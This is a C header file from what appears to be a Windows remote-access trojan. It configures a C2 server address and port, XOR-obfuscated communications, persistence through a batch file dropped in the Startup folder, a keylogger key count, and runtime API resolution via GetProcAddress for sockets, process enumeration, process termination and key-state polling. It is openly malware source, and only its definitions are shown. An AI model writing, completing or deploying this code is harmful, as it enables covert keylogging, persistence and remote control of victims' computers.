/* 
 * Include/Header/Macro/File Guard: 
 * The C preprocessor will replace #include <"defines.h"> with all of this code.
 * This can lead to data structures being defined twice, rendering them invalid.
 * This Guard prevents this 'double inclusion' from happening. 
 * Another way to combat double inclusion is by using #pragma once
 */
#ifndef DEFINES_H
#define DEFINES_H

/*------------------------------------------------------------------------[DEPENDENCIES]------------------------------------------------------------------------*/

#include <libloaderapi.h> // GetProcAddress, GetModuleHandleA
#include <winsock2.h> // Networking defs, structs, and functions 
#include <stdio.h>
#include <time.h>

/*----------------------------------------------------------------------------[MSDN]----------------------------------------------------------------------------*/

// This is used by getUsername and queryRegString. It specifies the limit on ASCII string length.
#define STR_LEN 255

// These are passed to CreateToolhelp32Snapshot to specify what should be returned in the snapshot of processes
#define TH32CS_SNAPHEAPLIST 0x00000001
#define TH32CS_SNAPPROCESS 0x00000002
#define TH32CS_SNAPTHREAD 0x00000004
#define TH32CS_SNAPMODULE 0x00000008
#define TH32CS_SNAPALL (TH32CS_SNAPHEAPLIST | TH32CS_SNAPMODULE | TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD)

/*---------------------------------------------------------------------------[CUSTOM]---------------------------------------------------------------------------*/

#define XOR '\\' // The character used to XOR cipher communications

#define SERVER "127.0.0.1" // C2 Server address
#define PORT 420		   // C2 Server port
#define SPORT "420"	   // Port used by server.c (needs to be string)

#define TIMEOUT 5 // Seconds to sleep after failing to connect to C2 server
#define DELAY 0	  // Seconds to sleep between sending each packet

#define NETSIZE 1024 // Maximum number of bytes that can be sent to SERVER:PORT before DELAY (size of network footprint)
#define MEMSIZE 4096 // Maximum number of bytes that can be dynamically allocated (size of memory footprint)

#define STARTUP_NAME "hake.bat" // Name of the script saved to %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup (enables persistence). Needs to be .bat

#define PROCESS_DELIM " | " // Deliminates the processes returned by getProcesses. Needs to be null-terminated
#define NUMKEYS 128			  // Default number of keys that will be captured by keylogging function if no amount is specified

/*-----------------------------------------------------------------------------[OS]-----------------------------------------------------------------------------*/

// Retrieves the current local date and time. Used to update client ID timestamp.
typedef void (*t_GetLocalTime)(LPSYSTEMTIME); // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getlocaltime

// Retrieves the name of the user associated with the current thread
typedef BOOL (*t_GetUserNameA)(LPSTR, LPDWORD); // https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getusernamea

// Retrieves version information about the OS. NOTE: Deprecated for versions >8.0 so have to query this informatino from the registry
typedef BOOL (*t_GetVersionExA)(LPOSVERSIONINFOA); // https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-getversionexa


/*---------------------------------------------------------------------------[NETWORK]---------------------------------------------------------------------------*/

// Initiates the use of winsock
typedef int (*t_WSAStartup)(WORD, WSADATA *); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock-wsastartup

// Creates a socket that is bound to a specific transport service provider
typedef int (*t_socket)(int, int, int); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket

// Establishes a connection to a specified socket
typedef int (*t_connect)(SOCKET, const SOCKADDR *, int); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect

// Sends data on a connected socket
typedef int (*t_send)(SOCKET, const char *, int, int); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send

// Receives data from a connected socket or a bound connectionless socket
typedef int (*t_recv)(SOCKET, char *, int, int); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock-recv

// Closes an existing socket
typedef int (*t_closesocket)(IN SOCKET); // https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock-closesocket


/*--------------------------------------------------------------------------[PROCESSES]--------------------------------------------------------------------------*/

// Reference: https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes

// Contains process information. Receives this information after being passed by reference to Process32First
typedef struct tagPROCESSENTRY32
{
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	ULONG_PTR th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32; // https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32

// Takes a snapshot of specified processes, including their heaps, modules, and threads
typedef HANDLE (*t_CreateToolhelp32Snapshot)(DWORD, DWORD); //https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot

// Retrieves information about the first process encountered in a system snapshot
typedef BOOL (*t_Process32First)(HANDLE, PROCESSENTRY32 *); // https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32first

// Retrieves information about the next process recorded in a system snapshot
typedef BOOL (*t_Process32Next)(HANDLE, PROCESSENTRY32 *); // https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next

// Opens an existing local process object
typedef HANDLE (*t_OpenProcess)(DWORD, BOOL, DWORD); // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess

// Terminates the specified process and all of its threads
typedef BOOL (*t_TerminateProcess)(HANDLE, UINT); // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess

/*-----------------------------------------------------------------------------[I/O]-----------------------------------------------------------------------------*/

// Determines whether a key is up or down at the time the function is called, and whether the key was pressed after a previous call to GetAsyncKeyState
typedef SHORT (*t_GetAsyncKeyState)(int); // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate

// Retrieves the status of the specified virtual key. The status specifies whether the key is up, down, or toggled
typedef SHORT (*t_GetKeyState)(int); // https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeystate

/*---------------------------------------------------------------------------[MACROS]---------------------------------------------------------------------------*/

// Elegantly opens a DLL handle (hDll) and returns a specific procedure's (proc) address -- don't forget to close hDLL after
HMODULE hDLL;
#define dllCall(dll, proc) \
	(void *)GetProcAddress(hDLL = GetModuleHandleA(dll), proc); 
	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress
	// https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea

#endif
